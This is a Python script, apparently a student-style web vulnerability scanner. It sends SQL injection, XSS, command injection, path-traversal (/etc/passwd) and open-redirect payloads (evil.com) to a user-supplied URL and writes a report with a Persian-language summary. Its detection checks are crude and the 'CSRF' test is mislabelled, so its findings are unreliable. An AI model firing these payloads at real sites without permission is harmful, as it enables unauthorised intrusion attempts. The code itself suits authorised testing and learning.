import requests
from urllib.parse import urlparse
from datetime import datetime

sql_injection_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, username, password FROM users --",
    '" OR "a"="a',
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)' />",
    "<svg/onload=alert(1)>",
]

command_injection_payloads = [
    "; ls",
    "| ls",
    "`ls`",
    "; id",
]

file_inclusion_payloads = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "/etc/passwd",
]

open_redirect_payloads = [
    "http://evil.com",
    "https://evil.com",
]

csrf_payloads = [
    "<img src='http://example.com/csrf?cookie=' onerror='alert(1)' />",  ]


def check_ssl(url):
    try:
        response = requests.get(url, verify=True)
        if response.status_code == 200:
            return True
    except requests.exceptions.SSLError as ssl_error:
        return False
    except requests.exceptions.RequestException as e:
        return False
    return True


def test_sql_injection(url, payloads, report_file):
    vulnerabilities = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url, verify=True)
        if "error" in response.text or "mysql" in response.text or "sql" in response.text:
            vulnerabilities.append(f"Possible SQL Injection vulnerability found with payload: {payload}")
    if vulnerabilities:
        report_file.write("\n[SQL Injection Vulnerabilities]\n")
        for vuln in vulnerabilities:
            report_file.write(f"{vuln}\n")
    else:
        report_file.write("\n[SQL Injection Vulnerabilities] No issues found.\n")
    return bool(vulnerabilities)


def test_xss(url, payloads, report_file):
    vulnerabilities = []
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url, verify=True)
        if payload in response.text:
            vulnerabilities.append(f"Possible XSS vulnerability found with payload: {payload}")
    if vulnerabilities:
        report_file.write("\n[XSS Vulnerabilities]\n")
        for vuln in vulnerabilities:
            report_file.write(f"{vuln}\n")
    else:
        report_file.write("\n[XSS Vulnerabilities] No issues found.\n")
    return bool(vulnerabilities)


def test_command_injection(url, payloads, report_file):
    vulnerabilities = []
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url, verify=True)
        if "root" in response.text or "uid=" in response.text:
            vulnerabilities.append(f"Possible Command Injection vulnerability found with payload: {payload}")
    if vulnerabilities:
        report_file.write("\n[Command Injection Vulnerabilities]\n")
        for vuln in vulnerabilities:
            report_file.write(f"{vuln}\n")
    else:
        report_file.write("\n[Command Injection Vulnerabilities] No issues found.\n")
    return bool(vulnerabilities)


def test_file_inclusion(url, payloads, report_file):
    vulnerabilities = []
    for payload in payloads:
        test_url = f"{url}?file={payload}"
        response = requests.get(test_url, verify=True)
        if "root" in response.text or "passwd" in response.text:
            vulnerabilities.append(f"Possible File Inclusion vulnerability found with payload: {payload}")
    if vulnerabilities:
        report_file.write("\n[File Inclusion Vulnerabilities]\n")
        for vuln in vulnerabilities:
            report_file.write(f"{vuln}\n")
    else:
        report_file.write("\n[File Inclusion Vulnerabilities] No issues found.\n")
    return bool(vulnerabilities)


def test_open_redirect(url, payloads, report_file):
    vulnerabilities = []
    for payload in payloads:
        test_url = f"{url}?redirect={payload}"
        response = requests.get(test_url, verify=True)
        if response.url != url:
            vulnerabilities.append(f"Possible Open Redirect vulnerability found with payload: {payload}")
    if vulnerabilities:
        report_file.write("\n[Open Redirect Vulnerabilities]\n")
        for vuln in vulnerabilities:
            report_file.write(f"{vuln}\n")
    else:
        report_file.write("\n[Open Redirect Vulnerabilities] No issues found.\n")
    return bool(vulnerabilities)


def test_csrf(url, payloads, report_file):
    vulnerabilities = []
    for payload in payloads:
        test_url = f"{url}?csrf={payload}"
        response = requests.get(test_url, verify=True)
        if "alert(1)" in response.text: 
            vulnerabilities.append(f"Possible CSRF vulnerability found with payload: {payload}")
    if vulnerabilities:
        report_file.write("\n[CSRF Vulnerabilities]\n")
        for vuln in vulnerabilities:
            report_file.write(f"{vuln}\n")
    else:
        report_file.write("\n[CSRF Vulnerabilities] No issues found.\n")
    return bool(vulnerabilities)


url = input("Enter the URL to test (use https): ")


if not check_ssl(url):
    print("[SSL/TLS Error] SSL verification failed, skipping tests.")
else:


    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_filename = f"C:\\Users\\silver\\Desktop\\rostam hunter\\vulnerability_report_{timestamp}.txt"

    with open(report_filename, 'w', encoding='utf-8') as report_file:
        report_file.write(f"Vulnerability Report for {url}\n")
        report_file.write(f"Date and Time: {timestamp}\n")
        report_file.write("=" * 50 + "\n")

      
        sql_vuln = test_sql_injection(url, sql_injection_payloads, report_file)
        xss_vuln = test_xss(url, xss_payloads, report_file)
        command_vuln = test_command_injection(url, command_injection_payloads, report_file)
        file_inclusion_vuln = test_file_inclusion(url, file_inclusion_payloads, report_file)
        open_redirect_vuln = test_open_redirect(url, open_redirect_payloads, report_file)
        csrf_vuln = test_csrf(url, csrf_payloads, report_file)


        report_file.write("\n[خلاصه آسیب‌پذیری‌ها]\n")
        if sql_vuln:
            report_file.write("آسیب‌پذیری SQL Injection یافت شد.\n")
        else:
            report_file.write("هیچ آسیب‌پذیری SQL Injection یافت نشد.\n")
        
        if xss_vuln:
            report_file.write("آسیب‌پذیری XSS یافت شد.\n")
        else:
            report_file.write("هیچ آسیب‌پذیری XSS یافت نشد.\n")

        if command_vuln:
            report_file.write("آسیب‌پذیری Command Injection یافت شد.\n")
        else:
            report_file.write("هیچ آسیب‌پذیری Command Injection یافت نشد.\n")
        
        if file_inclusion_vuln:
            report_file.write("آسیب‌پذیری File Inclusion یافت شد.\n")
        else:
            report_file.write("هیچ آسیب‌پذیری File Inclusion یافت نشد.\n")
        
        if open_redirect_vuln:
            report_file.write("آسیب‌پذیری Open Redirect یافت شد.\n")
        else:
            report_file.write("هیچ آسیب‌پذیری Open Redirect یافت نشد.\n")
        
        if csrf_vuln:
            report_file.write("آسیب‌پذیری CSRF یافت شد.\n")
        else:
            report_file.write("هیچ آسیب‌پذیری CSRF یافت نشد.\n")

    print(f"Report saved as {report_filename}")
